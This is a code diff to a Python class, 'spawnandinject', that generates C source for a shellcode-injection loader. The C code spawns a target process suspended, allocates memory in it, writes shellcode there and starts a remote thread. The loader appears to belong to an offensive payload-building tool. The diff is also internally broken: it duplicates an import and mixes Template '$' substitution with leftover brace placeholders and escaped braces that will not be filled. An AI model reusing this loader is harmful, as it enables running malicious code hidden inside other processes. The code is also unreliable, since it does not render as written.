@@ -1,3 +1,7 @@
+from string import Template
+
+from string import Template
+
 class spawnandinject:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
@@ -17,8 +21,8 @@ class spawnandinject:
     def compilerOptions(self) -> list[str]:
         return []
 
-    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
-        return f"""
+    def template(self) -> str:
+        return Template("""
 {imports}
 
 {codeblocks}
@@ -40,12 +44,12 @@ int main()
     SIZE_T NumberOfBytesRead;
     DWORD AddressOfEntryPoint;
 
-    CreateProcessA(NULL, (LPSTR) "{self.target}", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+    CreateProcessA(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
     LPVOID pRemoteCode = NULL;
     HANDLE hThread = NULL;
 
-    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, {self.memoryPermission});
+    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, $memoryPermission);
     WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID)shellcode, (SIZE_T){shellcodeSize}, (SIZE_T *)NULL);
     
     hThread = CreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
@@ -57,4 +61,4 @@ int main()
 
     return 0;
 }}
-"""
+""").substitute(target=self.target, memoryPermission=self.memoryPermission)
